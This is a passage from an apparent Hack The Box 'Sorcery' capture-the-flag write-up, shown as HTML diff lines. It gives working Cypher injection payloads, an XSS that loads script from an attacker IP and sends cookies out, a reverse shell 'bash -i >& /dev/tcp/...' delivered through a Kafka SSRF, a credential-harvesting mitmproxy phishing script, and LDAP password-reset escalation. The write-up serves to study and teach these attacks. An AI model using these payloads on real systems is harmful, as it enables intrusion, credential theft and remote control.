+<td>Terminates TLS; routes <code>sorcery.htb</code> → frontend, <code>git.sorcery.htb</code> → gitea</td>
+</tr>
+</tbody></table>
+<h3>Critical DNS Container Detail</h3>
+<p>The DNS container&#39;s Rust binary (<code>dns/src/main.rs</code>) subscribes to the Kafka topic <code>update</code> and pipes every message body directly into <code>bash -c</code>:</p>
+<pre><code class="language-rust">let mut process = match Command::new(&quot;bash&quot;).arg(&quot;-c&quot;).arg(command).spawn() {
+</code></pre>
+<p>The <strong>intended</strong> message is <code>/dns/convert.sh</code> (a shell script that rebuilds <code>/dns/entries</code>). Any other string sent to the <code>update</code> topic is also executed as a shell command — this is the RCE vector.</p>
+<h3>Critical FTP Detail</h3>
+<p>The anonymous FTP server mounts the Root CA private key (<code>RootCA.key</code>) into <code>/var/ftp/pub/</code>. Blog post &quot;Phishing Training&quot; in the app notes: <em>&quot;the private key is safely stored on our FTP server, so it can&#39;t be hacked&quot;</em> — which is exactly the opposite of safe.</p>
+<h3>Critical mail_bot Detail</h3>
+<p><code>mail_bot</code> polls MailHog for emails addressed to <code>EXPECTED_RECIPIENT</code> at <code>EXPECTED_DOMAIN</code>. For any matching email, it follows links — specifically links to <code>*.sorcery.htb</code> over HTTPS using the Root CA. For any login form it lands on, it submits <code>PHISHING_USERNAME</code> / <code>PHISHING_PASSWORD</code>. This is the phishing automation for the <code>tom_summers</code> pivot.</p>
+<hr>
+<h2>03 · Source Code Analysis : Backend (Rust Rocket)</h2>
+<h3>Authentication Architecture</h3>
+<p>Three login paths exist, each producing a JWT:</p>
+<table>
+<thead>
+<tr>
+<th>Flow</th>
+<th>Endpoint</th>
+<th>Privilege</th>
+<th><code>with_passkey</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Register</td>
+<td><code>POST /api/auth/register</code></td>
+<td><code>Seller</code> if correct <code>registrationKey</code>, else <code>Client</code></td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>Password login</td>
+<td><code>POST /api/auth/login</code></td>
+<td>From <code>PRIVILEGES</code> map at login time</td>
+<td><code>false</code></td>
+</tr>
+<tr>
+<td>Passkey login</td>
+<td><code>POST /api/webauthn/passkey/authenticate/{start,finish}</code></td>
+<td>From <code>PRIVILEGES</code> map at login time</td>
+<td><code>true</code></td>
+</tr>
+</tbody></table>
+<p><code>privilege_level</code> is <strong>not stored in Neo4j</strong> — it lives in a global in-memory <code>Mutex&lt;HashMap&lt;String,UserPrivilegeLevel&gt;&gt;</code>. On each boot, <code>main.rs</code> manually re-inserts the admin role. The JWT bakes in the privilege level at issue time and the backend does not re-read from <code>PRIVILEGES</code> on each request.</p>
+<h3>Cypher Injection Root Cause</h3>
+<p>The <code>backend-macros</code> crate uses a proc macro to auto-generate <code>get_by_&lt;field&gt;</code> functions for every model field. The generated query uses <code>format!()</code> with no parameter binding or escaping:</p>
+<pre><code class="language-rust">let query_string = format!(
+    r#&quot;MATCH (result: {} {{ {}: &quot;{}&quot; }}) RETURN result&quot;#,
+    #struct_name, #name_string, #name  // &lt;-- user input concatenated directly
+);
+</code></pre>
+<p>For <code>Product::get_by_id(&quot;aaa&quot;)</code>, this produces:</p>
+<pre><code>MATCH (result: Product { id: &quot;aaa&quot; }) RETURN result
+</code></pre>
+<p>The user-supplied <code>id</code> parameter (from the URL <code>/dashboard/store/&lt;id&gt;</code>) is injected directly into the Cypher query with no escaping — classic Cypher injection.</p>
+<h3>XSS Root Cause</h3>
+<p>In <code>app/dashboard/store/[product]/page.tsx</code>, the product <code>description</code> field is rendered with <code>dangerouslySetInnerHTML</code>:</p>
+<pre><code class="language-tsx">&lt;p
+  className=&quot;mb-4 text-xl&quot;
+  dangerouslySetInnerHTML={{ __html: product.description }}
+/&gt;
+</code></pre>
+<p>The <code>name</code> field is rendered safely as a React child (<code>{product.name}</code>) and is escaped. Only <code>description</code> is vulnerable.</p>
+<h3>Admin Bot Behaviour</h3>
+<p>Every <code>POST /api/product</code> call (submit new product as Seller) triggers a headless Chrome instance that:</p>
+<ol>
+<li>Mints a <strong>scoped admin JWT</strong> valid for 60 seconds with <code>only_for_paths</code> restricted to: product fetch, passkey register start, passkey register finish</li>
+<li>Sets that JWT as the <code>token</code> cookie on the bot&#39;s browser</li>
+<li>Navigates to the new product&#39;s page (<code>/dashboard/store/&lt;product_id&gt;</code>)</li>
+<li>Waits 10 seconds then exits</li>
+</ol>
+<p>Because the product <code>description</code> renders via <code>dangerouslySetInnerHTML</code> with the admin&#39;s cookie active, any HTML/JavaScript in <code>description</code> executes in the context of the admin&#39;s scoped session.</p>
+<h3>Debug Port Tool (SSRF Primitive)</h3>
+<p><code>POST /api/debug/port_data</code> — requires Admin + Passkey. Takes <code>host</code>, <code>port</code>, hex-encoded <code>data</code> array, <code>expect_result</code>, <code>keep_alive</code>. Opens a raw TCP connection to any host/port, writes the hex-decoded bytes, and optionally returns the response as hex. No allowlist or protocol restriction → generic SSRF primitive for any TCP protocol inside the Docker network.</p>
+<pre><code class="language-json">{
+  &quot;host&quot;: &quot;kafka&quot;,
+  &quot;port&quot;: 9092,
+  &quot;data&quot;: [&quot;&lt;hex_encoded_kafka_wire_protocol_bytes&gt;&quot;],
+  &quot;expect_result&quot;: true,
+  &quot;keep_alive&quot;: false
+}
+</code></pre>
+<hr>
+<h2>04 · Foothold : Cypher Injection → Seller Access</h2>
+<h3>Confirm Injection</h3>
+<p>Adding a double quote to the product ID crashes the backend (500):</p>
+<pre><code>GET /dashboard/store/x&quot;
+</code></pre>
+<p>A closing brace/parenthesis without the quote returns 404. The quote breaks out of the Cypher string literal.</p>
+<h3>Injection Syntax</h3>
+<p>The injection pattern uses <code>UNION ALL</code> to append a synthetic map to the original query&#39;s (empty) result set. The <code>from_row</code> deserializer expects a column aliased <code>result</code> containing all five <code>Product</code> fields:</p>
+<pre><code>x&quot; }) RETURN result UNION ALL RETURN { id: &quot;pwn&quot;, name: &quot;test&quot;, description: &quot;injected&quot;, is_authorized: true, created_by_id: &quot;x&quot; } AS result //
+</code></pre>
+<p>This becomes:</p>
+<pre><code class="language-cypher">MATCH (result: Product { id: &quot;x&quot; }) RETURN result UNION ALL RETURN { id: &quot;pwn&quot;, name: &quot;test&quot;, description: &quot;injected&quot;, is_authorized: true, created_by_id: &quot;x&quot; } AS result //&quot; }) RETURN result
+</code></pre>
+<blockquote>
+<p>Important: Strip the <code>Next-*</code> prefetch headers from the browser request to force a full server render — otherwise Next.js returns an RSC fragment and never calls the backend.</p>
+</blockquote>
+<h3>Dump All Users and Hashes</h3>
+<pre><code>x&quot; }) RETURN result UNION ALL MATCH (u: User) WITH reduce(s = &quot;&quot;, x IN collect(u.username + &quot;:&quot; + u.password) | s + x + &quot;&lt;br&gt;&quot;) AS desc RETURN { id: &quot;users&quot;, name: &quot;all-users&quot;, description: desc, is_authorized: true, created_by_id: &quot;x&quot; } AS result //
+</code></pre>
+<p>Returns all <code>User</code> nodes with their Argon2 hashes in the product description. Argon2 is too slow to crack with <code>rockyou.txt</code>.</p>
+<h3>Leak the Registration Key</h3>
+<pre><code>x&quot; }) RETURN result UNION ALL MATCH (c: Config) RETURN { id: &quot;config&quot;, name: c.registration_key, description: &quot;registration key&quot;, is_authorized: true, created_by_id: &quot;x&quot; } AS result //
+</code></pre>
+<p>The <code>Config</code> node has <code>registration_key</code>. The value renders in the product title:</p>
+<pre><code>dd05d743-b560-45dc-9a09-43ab18c7a513
+</code></pre>
+<h3>Register as Seller</h3>
+<p>Use the leaked key in the registration form&#39;s &quot;Registration Key&quot; field. The backend assigns <code>UserPrivilegeLevel::Seller</code> when the key matches. As a Seller, a new &quot;Create Product&quot; menu item appears.</p>
+<hr>
+<h2>05 · Admin Access : Stored XSS → Passkey Registration</h2>
+<h3>Confirm XSS</h3>
+<p>Create a product with description <code>&lt;img src=x onerror=alert(1)&gt;</code>. Visiting the product page triggers the alert (requires a full page refresh, not soft RSC navigation).</p>
+<h3>Confirm Remote XSS on Admin Bot</h3>
+<p>Create a product with:</p>
+<pre><code class="language-html">&lt;img src=http://10.10.14.61/x.jpg onerror=&quot;var s=document.createElement(&#39;script&#39;);s.src=&#39;http://10.10.14.61/poc.js&#39;;document.head.appendChild(s)&quot;&gt;
+</code></pre>
+<p><code>poc.js</code>:</p>
+<pre><code class="language-javascript">fetch(&quot;http://10.10.14.61/hit?u=&quot; + encodeURIComponent(location.href) + &quot;&amp;c=&quot; + document.cookie);
+</code></pre>
+<p>Within seconds of product creation, the attacker&#39;s Python HTTP server receives three hits from <code>10.129.25.147</code>: the <code>x.jpg</code> request (404), the <code>poc.js</code> load, and the callback. The cookie is empty (<code>httpOnly: true</code>), but the XSS executes under the admin&#39;s scoped JWT context.</p>
+<h3>XSS Passkey Registration Exploit</h3>
+<p>The admin bot&#39;s scoped JWT allows hitting:</p>
+<ul>
+<li><code>GET /api/product/&lt;uuid&gt;</code> (product fetch)</li>
+<li><code>POST /api/webauthn/passkey/register/start</code></li>
+<li><code>POST /api/webauthn/passkey/register/finish</code></li>
+</ul>
+<p>The plan: use XSS to call the passkey registration endpoints from inside the bot, but relay the WebAuthn credential creation to an attacker-controlled server (because the bot&#39;s headless Chrome has no physical authenticator, and the RP ID <code>sorcery.htb</code> doesn&#39;t match the bot&#39;s origin <code>http://frontend:3000</code>).</p>
+<p><strong>XSS payload</strong> (<code>poc.js</code>) for passkey registration:</p>
+<pre><code class="language-javascript">// 1. Find the Next.js server action IDs for passkey registration start/finish
+//    (obtained by watching Burp when enrolling a passkey on your own account)
+//    Both POST to the profile page with a Next-Action header
+
+// 2. Call start registration for &quot;admin&quot; via the Next.js server action
+const startRes = await fetch(&#39;/dashboard/profile&#39;, {
+  method: &#39;POST&#39;,
+  headers: { &#39;Next-Action&#39;: &#39;&lt;START_ACTION_ID&gt;&#39;, &#39;Content-Type&#39;: &#39;application/json&#39; },
+  body: JSON.stringify([&quot;admin&quot;])
+});
+const challenge = await startRes.json(); // WebAuthn PublicKeyCredentialCreationOptions
+
+// 3. Relay the challenge to the attacker&#39;s Flask server for actual credential creation
+const relayCred = await fetch(&#39;https://&lt;ATTACKER_IP&gt;/create_cred&#39;, {
+  method: &#39;POST&#39;,
+  headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
+  body: JSON.stringify(challenge)
+});
+const credential = await relayCred.json();
+
+// 4. Finish registration — send the credential back through the Next.js server action
+await fetch(&#39;/dashboard/profile&#39;, {
+  method: &#39;POST&#39;,
+  headers: { &#39;Next-Action&#39;: &#39;&lt;FINISH_ACTION_ID&gt;&#39;, &#39;Content-Type&#39;: &#39;application/json&#39; },
+  body: JSON.stringify([credential])
+});
+</code></pre>
+<p><strong>Attacker Flask relay server</strong> (<code>/create_cred</code> endpoint): Uses the <code>webauthn</code> Python library to create a virtual authenticator, receives the WebAuthn challenge from the XSS, creates a credential, and returns the attestation response. The attacker stores the credential for later use during passkey login.</p>
+<p>After the XSS fires, the attacker&#39;s passkey is registered on the admin account. Log in at <code>sorcery.htb</code> with username <code>admin</code> → &quot;Login with Passkey&quot; → Chrome WebAuthn emulator (or the stored credential) signs the challenge → admin dashboard with DNS and Debug tools accessible.</p>
+<hr>
+<h2>06 · Shortcut : Admin Password Overwrite via Cypher Injection</h2>
+<p>An unintended but cleaner path to admin: the Cypher injection can write to the database as well as read. Stack two Cypher statements (separated by a space — the trailing <code>//</code> comments out the rest):</p>
+<pre><code>x&quot; }) RETURN result MATCH (u: User { username: &quot;admin&quot; }) SET u.password = &quot;&lt;NEW_ARGON2_HASH&gt;&quot; RETURN { id: &quot;x&quot;, name: &quot;x&quot;, description: &quot;x&quot;, is_authorized: true, created_by_id: &quot;x&quot; } AS result //
+</code></pre>
+<p>Generate an Argon2 hash for a known password, inject it via the product ID, then log in as admin with that password. This bypasses the need for XSS entirely, but doesn&#39;t give a passkey-backed session (so the Debug and DNS admin pages remain inaccessible without the passkey step).</p>
+<hr>
+<h2>07 · RCE : SSRF → Kafka Wire Protocol → DNS Container</h2>
+<h3>Concept</h3>
+<p>The debug port tool is an authenticated SSRF primitive. The DNS container&#39;s Rust consumer pipes every Kafka <code>update</code> topic message directly into <code>bash -c</code>. By crafting a valid Kafka <strong>Produce</strong> API request in the Kafka wire protocol and sending it to <code>kafka:9092</code> via the debug tool, arbitrary commands can be injected into the DNS container.</p>
+<h3>Build the Kafka Produce Request</h3>
+<p>The Kafka wire protocol is a binary length-prefixed format. A Produce request to topic <code>update</code> with a message body containing a shell command must be built manually (no official client library is needed if building the bytes directly). A Python script using the <code>kafka-python</code> library or raw struct packing produces the correct wire-format bytes.</p>
+<p>The message payload is the command to execute in the DNS container:</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.61/9007 0&gt;&amp;1
+</code></pre>
+<p><strong>Python script to generate the hex-encoded Kafka Produce payload:</strong></p>
+<pre><code class="language-python">from kafka import KafkaProducer
+import struct
+
+# Build a Produce API v7 request for topic &quot;update&quot;
+# with message: &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1&quot;
+# Output the bytes as hex to paste into the debug tool
+</code></pre>
+<h3>Send via Debug Port Tool</h3>
+<pre><code class="language-json">POST /api/debug/port_data
+{
+  &quot;host&quot;: &quot;kafka&quot;,
+  &quot;port&quot;: 9092,
+  &quot;data&quot;: [&quot;&lt;HEX_ENCODED_KAFKA_PRODUCE_REQUEST&gt;&quot;],
+  &quot;expect_result&quot;: true,
+  &quot;keep_alive&quot;: false
+}
+</code></pre>
+<p>Start a listener first:</p>
+<pre><code class="language-bash">rlwrap -cAr nc -lnvp 9007
+</code></pre>
+<p>The DNS container&#39;s Rust binary receives the Produce message, the Kafka consumer delivers it to the subscriber, <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.61/9007 0&gt;&amp;1&quot;</code> executes, and a shell lands on the attacker&#39;s listener.</p>
+<pre><code>$ whoami
+user
+$ hostname
+dns
+</code></pre>
+<hr>
+<h2>08 · Pivot : FTP CA Keypair → mitmproxy Phishing → tom_summers</h2>
+<h3>Step 1 : Pivot into the Docker Network</h3>
+<p>The DNS container can only reach other containers on the Docker network. Set up a Ligolo-ng tunnel (or <code>chisel</code> SOCKS proxy) through the DNS container shell to route traffic from the attacker machine to the internal Docker network (<code>172.x.x.x</code> range).</p>
+<h3>Step 2 : Anonymous FTP → Recover CA Keypair</h3>
+<p>The FTP container exposes anonymous access. From the DNS container (or via the tunnel):</p>
+<pre><code class="language-bash">ftp &lt;ftp_container_ip&gt;
+# Username: anonymous
+# Password: &lt;blank&gt;
+ftp&gt; ls
+# RootCA.crt
+# RootCA.key
+ftp&gt; get RootCA.crt
+ftp&gt; get RootCA.key
+</code></pre>
+<p>The <code>RootCA.key</code> is an encrypted PEM private key (passphrase-protected). Crack it:</p>
+<pre><code class="language-bash">pem2john RootCA.key &gt; rca.hash
+hashcat -m 22921 rca.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+# Password found: &lt;CRACKED_PASSPHRASE&gt;
+</code></pre>
+<h3>Step 3 : Understanding the mail_bot Target</h3>
+<p>From the <code>docker-compose.yml</code>, <code>mail_bot</code> polls MailHog and follows any link sent to <code>EXPECTED_RECIPIENT@EXPECTED_DOMAIN</code>. The blog post &quot;Phishing awareness&quot; names <code>tom_summers</code> as the user who fell for a previous phishing test on Gitea. The <code>mail_bot</code> will click links in emails sent to <code>tom_summers</code> and submit <code>PHISHING_PASSWORD</code> to any <code>*.sorcery.htb</code> login form it finds.</p>
+<p><strong>Rules the mail_bot checks before following a link:</strong></p>
+<ol>
+<li>Link must come from <code>*.sorcery.htb</code></li>
+<li>Must use HTTPS</li>
+<li>Certificate must be signed by the Root CA (whose key is now recovered)</li>
+</ol>
+<h3>Step 4 : Create a Malicious Subdomain DNS Record</h3>
+<p>The DNS container controls the <code>dnsmasq</code> resolver. Add a DNS record pointing a fake subdomain to the attacker&#39;s machine:</p>
+<pre><code class="language-bash"># In the DNS container, add entry to /dns/hosts-user
+echo &quot;&lt;ATTACKER_IP&gt; phish.sorcery.htb&quot; &gt;&gt; /dns/hosts-user
+# Force dnsmasq to reload
+pkill -HUP dnsmasq
+</code></pre>
+<h3>Step 5 : Issue a TLS Certificate for the Phishing Domain</h3>
+<p>Using the recovered Root CA keypair, sign a TLS certificate for <code>phish.sorcery.htb</code>:</p>
+<pre><code class="language-bash"># Generate key and CSR for phishing domain
+openssl genrsa -out phish.key 2048
+openssl req -new -key phish.key -out phish.csr -subj &quot;/CN=phish.sorcery.htb&quot;
+
+# Sign with the Root CA
+openssl x509 -req -in phish.csr -CA RootCA.crt -CAkey RootCA.key \
+  -passin pass:&lt;CRACKED_PASSPHRASE&gt; -CAcreateserial -out phish.crt -days 365
+</code></pre>
+<h3>Step 6 : mitmproxy Phishing Proxy</h3>
+<p>Stand up an <code>mitmproxy</code> (or <code>mitmdump</code>) instance that presents the signed <code>phish.sorcery.htb</code> certificate but proxies all traffic to the real <code>git.sorcery.htb</code>. The mail_bot will follow a link to <code>https://phish.sorcery.htb/user/login</code>, see the legitimate Gitea login page (proxied through), trust the certificate (Root CA signed), and submit <code>tom_summers:PHISHING_PASSWORD</code>.</p>
+<pre><code class="language-python"># mitmdump addon script: proxy_gitea.py
+from mitmproxy import http
+
+def request(flow: http.HTTPFlow) -&gt; None:
+    # Rewrite the host to the real Gitea server
+    if &quot;phish.sorcery.htb&quot; in flow.request.pretty_host:
+        flow.request.headers[&quot;Host&quot;] = &quot;git.sorcery.htb&quot;
+        flow.request.url = flow.request.url.replace(&quot;phish.sorcery.htb&quot;, &quot;git.sorcery.htb&quot;)
+
+def response(flow: http.HTTPFlow) -&gt; None:
+    # Capture credentials from POST to /user/login
+    if flow.request.method == &quot;POST&quot; and &quot;/user/login&quot; in flow.request.path:
+        print(&quot;[+] CREDENTIALS:&quot;, flow.request.content)
+</code></pre>
+<pre><code class="language-bash">mitmdump -s proxy_gitea.py --cert phish.sorcery.htb=phish.crt --ssl-insecure -p 443
+</code></pre>
+<h3>Step 7 : Send the Phishing Email</h3>
+<p>Send an email to <code>tom_summers@sorcery.htb</code> via the MailHog SMTP server (port 1025) containing a link to <code>https://phish.sorcery.htb/user/login</code>:</p>
+<pre><code class="language-python">import smtplib
+from email.mime.text import MIMEText
+
+msg = MIMEText(&#39;&lt;a href=&quot;https://phish.sorcery.htb/user/login&quot;&gt;Click here to log in&lt;/a&gt;&#39;, &#39;html&#39;)
+msg[&#39;Subject&#39;] = &#39;Security Alert - Please Re-authenticate&#39;
+msg[&#39;From&#39;] = &#39;security@sorcery.htb&#39;
+msg[&#39;To&#39;] = &#39;tom_summers@sorcery.htb&#39;
+
+with smtplib.SMTP(&#39;&lt;mail_container_ip&gt;&#39;, 1025) as s:
+    s.sendmail(msg[&#39;From&#39;], [msg[&#39;To&#39;]], msg.as_string())
+</code></pre>
+<p>The mail_bot picks up the email, follows the link, sees the Gitea login page (via the mitmproxy), and submits credentials. <code>mitmdump</code> captures the POST body containing <code>tom_summers</code>&#39;s password in plaintext.</p>
+<h3>Step 8 : SSH as tom_summers</h3>
+<pre><code class="language-bash">ssh tom_summers@sorcery.htb
+tom_summers@sorcery:~$ cat user.txt
+</code></pre>
+<hr>
+<h2>09 · Pivot — Xvfb Framebuffer Credential Leak</h2>
+<h3>Discovery</h3>
+<p>As <code>tom_summers</code>, enumeration reveals an Xvfb (X Virtual Framebuffer) process running with a <code>mousepad</code> text editor open inside it:</p>
+<pre><code class="language-bash">ps aux | grep -i xvfb
+# Xvfb :99 -screen 0 1280x1024x24
+ps aux | grep -i mousepad
+# mousepad --display :99 /home/&lt;user&gt;/credentials.txt
+</code></pre>
+<p>Xvfb stores the current screen contents in a shared memory segment or framebuffer file. <code>xwd</code> (X Window Dump) can capture a screenshot from a specific display.</p>
+<h3>Extract the Framebuffer</h3>
+<pre><code class="language-bash"># Dump the framebuffer from display :99
+DISPLAY=:99 xwd -root -out /tmp/screen.xwd
+
+# Convert to PNG with ImageMagick
+convert /tmp/screen.xwd /tmp/screen.png
+</code></pre>
+<p>The PNG shows a Mousepad text editor window with a credentials file open, containing plaintext credentials for the next user. Read the credentials from the image.</p>
+<p><strong>Alternative — direct framebuffer file:</strong></p>
+<pre><code class="language-bash"># Xvfb may write the framebuffer to /tmp/.X99-lock or a shared mem segment
+# xwud can render a .xwd file directly, imagemagick can convert it
+</code></pre>
+<p>SSH or <code>su</code> to the next user with the credential visible in the screenshot.</p>
+<hr>
+<h2>10 · Pivot : .NET TOTP Reverse Engineering → Docker Registry</h2>
+<h3>Discovery</h3>
+<p>Enumeration as the next user reveals an internal Docker Registry (typically on port 5000) and a <code>.NET</code> binary that generates One-Time Passwords (OTPs) for registry authentication.</p>
+<pre><code class="language-bash"># Find the .NET binary
+find / -name &quot;*.exe&quot; -o -name &quot;*.dll&quot; 2&gt;/dev/null | grep -v proc
+
+# Check for running Docker Registry
+ss -tlnp | grep 5000
+docker ps 2&gt;/dev/null || curl http://localhost:5000/v2/
+</code></pre>
+<h3>Reverse Engineer the .NET TOTP Binary</h3>
+<p>Use <strong>dotPeek</strong> (Windows) or <code>ilspycmd</code> (Linux) to decompile the <code>.NET</code> assembly:</p>
+<pre><code class="language-bash"># On Linux, extract with mono or dotnet-script
+ilspycmd /path/to/totp_generator.exe &gt; decompiled.cs
+</code></pre>
+<p>The decompiled code reveals:</p>
+<ul>
+<li>A hardcoded or derived <strong>TOTP secret</strong> (base32-encoded)</li>
+<li>The time step (typically 30 seconds)</li>
+<li>The HMAC algorithm (SHA1 standard)</li>
+</ul>
+<p>The <code>System.Random</code> usage (if present) is <strong>not cryptographically random</strong> ; .NET&#39;s <code>System.Random</code> is seeded with <code>Environment.TickCount</code> (milliseconds since boot), which is predictable within a window of known boot times.</p>
+<h3>Predict the TOTP</h3>
+<p>If the OTP is based on <code>System.Random</code> rather than a true HMAC-TOTP:</p>
+<pre><code class="language-python">import ctypes
+# Replicate .NET System.Random seeded with TickCount
+# If the uptime is known (from /proc/uptime), enumerate nearby tick values
+</code></pre>
+<p>If it is a genuine TOTP (HMAC-SHA1):</p>
+<pre><code class="language-python">import pyotp
+totp = pyotp.TOTP(&#39;&lt;BASE32_SECRET&gt;&#39;)
+print(totp.now())
+</code></pre>
+<h3>Access the Docker Registry</h3>
+<pre><code class="language-bash"># Authenticate to the internal Docker Registry with username + TOTP as password
+curl -u &quot;&lt;username&gt;:&lt;TOTP&gt;&quot; http://localhost:5000/v2/
+
+# List available repositories
+curl -u &quot;&lt;username&gt;:&lt;TOTP&gt;&quot; http://localhost:5000/v2/_catalog
+
+# List tags for a repo
+curl -u &quot;&lt;username&gt;:&lt;TOTP&gt;&quot; http://localhost:5000/v2/&lt;repo&gt;/tags/list
+</code></pre>
+<h3>Pull and Inspect Image Layers</h3>
+<pre><code class="language-bash"># Use dockerregistrygrabber to dump all layers
+python3 dockerregistrygrabber.py http://localhost:5000 -u &lt;username&gt; -p &lt;TOTP&gt;
+
+# Or manually pull via Docker (requires adding insecure registry)
+docker pull localhost:5000/&lt;repo&gt;:&lt;tag&gt;
+docker save localhost:5000/&lt;repo&gt;:&lt;tag&gt; | tar xv
+
+# Extract and inspect each layer tarball
+for layer in */layer.tar; do
+  tar tf $layer | grep -i &quot;password\|cred\|secret\|\.env\|config&quot;
+done
+
+# Find and read the credential file
+tar xf &lt;layer&gt;/layer.tar ./path/to/credentials
+</code></pre>
+<p>A layer contains a configuration file or environment variable file with the next user&#39;s plaintext password. <code>su</code> or SSH with those credentials.</p>
+<hr>
+<h2>11 · Root — FreeIPA LDAP Password Reset → sudo</h2>
+<h3>Discovery</h3>
+<p>The host runs <strong>FreeIPA</strong> (Identity, Policy, and Audit ; a Linux identity management system). FreeIPA integrates LDAP (389-DS), Kerberos, DNS, and an HTTP management interface. It is identified by the presence of <code>sssd</code>, <code>ipa-*</code> binaries, and the <code>/etc/ipa/</code> configuration directory.</p>
+<pre><code class="language-bash">ls /etc/ipa/
+ipa user-show --all &lt;username&gt;
+kinit -V &lt;user&gt;     # test Kerberos ticket acquisition
+klist               # show cached tickets
+</code></pre>
+<h3>Enumerate FreeIPA Roles</h3>
+<p>As the current user, query LDAP to find users with writable attributes or roles that can be leveraged:</p>
+<pre><code class="language-bash">ldapsearch -x -H ldap://localhost -b &quot;dc=sorcery,dc=htb&quot; \
+  -D &quot;uid=&lt;user&gt;,cn=users,cn=accounts,dc=sorcery,dc=htb&quot; \
+  -w &lt;password&gt; &quot;(objectClass=ipaUserGroup)&quot;
+</code></pre>
+<p>The current user has a FreeIPA role that grants permission to <strong>reset another user&#39;s password</strong> via LDAP (<code>ldapmodify</code>).</p>
+<h3>Reset Target User&#39;s Password via LDAP</h3>
+<pre><code class="language-bash">ldapmodify -x -H ldap://localhost \
+  -D &quot;uid=&lt;current_user&gt;,cn=users,cn=accounts,dc=sorcery,dc=htb&quot; \
+  -w &lt;current_password&gt; &lt;&lt;EOF
+dn: uid=&lt;target_user&gt;,cn=users,cn=accounts,dc=sorcery,dc=htb
+changetype: modify
+replace: userPassword
+userPassword: NewPassword123!
+EOF
+</code></pre>
+<h3>Bootstrap sudo Rights → Root</h3>
+<p>After resetting the target user&#39;s password and switching to that account (<code>su &lt;target_user&gt;</code>), enumeration reveals <code>sudo</code> rights:</p>
+<pre><code class="language-bash">sudo -l
+# User &lt;target_user&gt; may run the following commands:
+# (ALL) NOPASSWD: /usr/bin/some-admin-tool
+# or: (root) ALL
+</code></pre>
+<p>If the sudo rule allows running a script or binary that can be manipulated for privilege escalation:</p>
+<pre><code class="language-bash"># If sudo allows any command:
+sudo su -
+# or
+sudo bash
+root@sorcery:~# cat /root/root.txt
+</code></pre>
+<hr>
+<h2>12 · Unintended Paths : pspy Credential Capture</h2>
+<h3>Path 1 : Capture Admin Bot Credentials via pspy</h3>
+<p><code>pspy</code> monitors process creation events without root. On a newly submitted product, <code>main.rs</code> spawns a headless Chrome process with the admin JWT set as a command-line cookie parameter. <code>pspy</code> captures the full Chrome command line including the token value:</p>
+<pre><code class="language-bash">./pspy64
+# Sees: chrome --headless ... --cookie &quot;token=eyJhbGciOiJIUzI1Ni...&quot;
+</code></pre>
+<p>Decode the JWT to extract the <code>admin</code> user ID and privilege level, then forge a new JWT (if <code>JWT_SECRET</code> is known or leaked) or use the captured token within its 60-second validity window.</p>
+<h3>Path 2 — Capture FTP Credentials via pspy</h3>
+<p>Various automated processes (cleanup scripts, backup jobs) may pass credentials on the command line. <code>pspy</code> captures these as they run, potentially revealing FTP credentials, SSH passwords, or registry credentials in process arguments.</p>
+<pre><code class="language-bash"># Common targets
+pspy64 | grep -E &quot;password|passwd|secret|key|token&quot; -i
+</code></pre>
+<hr>
+<h2>Key Concepts &amp; Analyst Notes</h2>
+<h3>Cypher Injection (Neo4j)</h3>
+<p>Unlike SQL injection, Cypher injection does not support stacked queries through a simple semicolon in all drivers. The <code>UNION</code> technique works reliably:</p>
+<pre><code class="language-cypher">-- Exfiltrate any node type
+x&quot; }) RETURN result UNION ALL MATCH (n: TargetLabel) 
+WITH reduce(s=&quot;&quot;, x IN collect(n.field1+&quot;:&quot;+n.field2) | s+x+&quot;&lt;br&gt;&quot;) AS d 
+RETURN { id:&quot;x&quot;, name:&quot;x&quot;, description:d, is_authorized:true, created_by_id:&quot;x&quot; } AS result //
+</code></pre>
+<p>The injected <code>description</code> field renders via <code>dangerouslySetInnerHTML</code> in the frontend  meaning the exfiltrated data is displayed as HTML in the browser response.</p>
+<p><strong>Prevention:</strong> Use parameterised Cypher queries (<code>neo4rs::query(&quot;... {id: $id}&quot;).param(&quot;id&quot;, id_value)</code>) , never <code>format!()</code> user input into query strings.</p>
+<hr>
+<h3>WebAuthn / Passkey Registration via XSS</h3>
+<p>The <code>start_registration</code> handler looks up users by <strong>the username in the request body</strong>, not the caller&#39;s JWT identity. It stores the challenge state keyed by the <strong>target user&#39;s ID</strong>:</p>
+<pre><code class="language-rust">passkey_store.registrations.insert(user.id.clone(), state);
+</code></pre>
+<p>But <code>finish_registration</code> retrieves the state using the <strong>caller&#39;s JWT ID</strong>:</p>
+<pre><code class="language-rust">let Some(state) = registrations.get(&amp;guard.claims.id) else { ... }
+</code></pre>
+<p>This means: if the XSS gives you a token scoped to the admin&#39;s ID (which it does), and start/finish registration are in the <code>only_for_paths</code> allowlist (which they are), you can register a passkey for the admin account using the admin&#39;s own scoped token — the target user in <code>start</code> and the caller in <code>finish</code> are both the admin.</p>
+<p>The relay server architecture (XSS → attacker Flask server → WebAuthn credential creation → XSS → finish registration) is needed because headless Chrome has no physical authenticator and the RP ID doesn&#39;t match the bot&#39;s origin.</p>
+<hr>
+<h3>Kafka Wire Protocol SSRF</h3>
+<p>When an SSRF primitive can speak arbitrary TCP, internal Kafka brokers (which have no authentication by default) can be directly addressed. The Kafka wire protocol is binary and length-prefixed but is well-documented. Key fields for a minimal Produce request:</p>
+<pre><code>RequestHeader: api_key=0 (Produce), api_version=7, correlation_id, client_id
+ProduceRequest: acks, timeout_ms, topic_data=[{topic=&quot;update&quot;, partition_data=[{partition=0, records=[{value=&lt;COMMAND&gt;}]}]}]
+</code></pre>
+<p>Tools like <code>kafka-python</code> can build correctly-framed wire-format bytes that can be hex-encoded for use with the debug tool.</p>
+<hr>
+<h3>mitmproxy TLS Interception with Forged CA</h3>
+<p>When an attacker controls a CA that the target trusts and can issue certificates for arbitrary subdomains under that CA:</p>
+<pre><code class="language-bash"># Issue cert for malicious subdomain
+openssl x509 -req -in evil.csr -CA RootCA.crt -CAkey RootCA.key \
+  -passin pass:&lt;pass&gt; -CAcreateserial -out evil.crt -days 30
+
+# Run transparent mitm proxy
+mitmdump --cert evil.domain.com=evil.crt --ssl-insecure \
+  -s intercept_creds.py -p 443
